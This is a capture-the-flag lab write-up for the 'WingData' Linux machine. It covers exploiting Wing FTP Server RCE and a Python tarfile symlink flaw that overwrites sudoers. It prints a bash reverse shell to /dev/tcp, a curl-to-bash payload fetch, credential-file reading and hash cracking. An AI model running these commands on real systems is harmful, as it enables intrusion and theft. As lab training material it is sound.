# WingData
<br>

**OS:** Linux  
**Difficulty:** Easy  
**Date:** 5/3/26

<br>
<img width="1238" height="74" alt="image" src="https://github.com/user-attachments/assets/6b60c997-cd6e-45c9-af06-08d33c5f92ca" />


## Summary
WingData is a Linux machine running Apache with virtual host routing. Subdomain enumeration reveals a Wing FTP Server web interface running an outdated version vulnerable to unauthenticated RCE (CVE-2025-47812).
<br>
<img width="1540" height="702" alt="image" src="https://github.com/user-attachments/assets/1d6f4732-2f75-4842-a1ab-ea35c3bb38e5" />

## Recon
<br>
Added the target to /etc/hosts:

```bash
sudo nano /etc/hosts
```
Ran nmap scan:
```bash
nmap -sC -sV wingdata.htb
```
Found two open ports:  
Port 22 - SSH (OpenSSH 9.2)  
Port 80 - Apache 2.4.66 serving wingdata.htb
<br>

Ran gobuster on main domain:
```bash
gobuster dir -u http://wingdata.htb -w /usr/share/wordlists/dirb/common.txt
```
<br>  
<img width="728" height="412" alt="image" src="https://github.com/user-attachments/assets/37448b4b-1ea5-492c-9a1d-33bc09cbce4c" />

<br>
Looked thru rest of the site.
<img width="568" height="554" alt="image" src="https://github.com/user-attachments/assets/43a40551-dd0e-4a1a-9b4e-82ad45dd09e3" />

<br>
Added ftp.wingdata.htb to /etc/hosts:

```bash
sudo nano /etc/hosts
```
<br>

Version of FTP is vulnerable to RCE
<br>

<img width="1906" height="394" alt="image" src="https://github.com/user-attachments/assets/f7b46a3f-a5d4-4a44-8482-165f045752f1" />


## Steps
### 1. Initial Access
Created reverse shell payload and started HTTP server:
```bash
echo 'bash -i >& /dev/tcp/10.10.15.53/5555 0>&1' > /tmp/shell.sh
cd /tmp && python3 -m http.server 8080
```
Started listener:
```bash
nc -lvnp 5555
```
<br>
Triggered exploit:

```bash
python3 exploit.py -u http://ftp.wingdata.htb -c "curl http://10.10.15.53:8080/shell.sh|bash" -v
```
Shell received as wingftp user.
<br>

### 2. Credential Harvesting
Enumerated Wing FTP Server data directory:
```bash
ls /opt/wftpserver/Data/1/users/
# anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
```
<br>
Extracted password hash from wacky's config:

```bash
cat /opt/wftpserver/Data/1/users/wacky.xml
```
Found SHA-256 hash with salt WingFTP.
<br>

### 3. Cracking the Hash
```bash
echo "329redacted:WingFTP" > hash.txt
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1410 --show hash.txt
```
<br>

### 4. SSH as Wacky & User Flag
```bash
ssh wacky@wingdata.htb
cat ~/user.txt
```
<br>

### 5. Privilege Escalation
Checked sudo permissions:
```bash
sudo -l
```
```
(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```
The restore script uses tarfile.extractall() with filter="data" - vulnerable to a symlink/path traversal attack (CVE-2025-4517) that can overwrite /etc/sudoers.
<br>
Transferred custom exploit to target:
```bash
wget http://10.10.15.53:8080/exploit1.py -O /tmp/exploit1.py
python3 /tmp/exploit1.py
```
Exploit inputs:
- Username: wacky
- Vulnerable program: /opt/backup_clients/restore_backup_clients.py
- Drop directory: /opt/backup_clients/backups

The exploit generates a malicious tarball that uses nested symlinks to bypass PATH_MAX checks, traverses to /etc, and overwrites sudoers with wacky ALL=(ALL) NOPASSWD: ALL.
<br>
Triggered the restore script as root:
```bash
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_getsuga
```
<br>

### 6. Root & Flag
```bash
sudo su
cat /root/root.txt
```
<br>
<img width="691" height="408" alt="image" src="https://github.com/user-attachments/assets/02314481-57d7-4dac-af05-d37fd2febf04" />

## Lessons Learned
- Always check application config files for credentials.
- tarfile.extractall() in Python is dangerous.
- Sudo entries are your roadmap for privesc. sudo -l immediately told us the exact script to target.
- Custom exploit development pays off. Writing your own tooling (even if it needs debugging) deepens understanding of the vulnerability mechanics versus just running someone else's PoC.
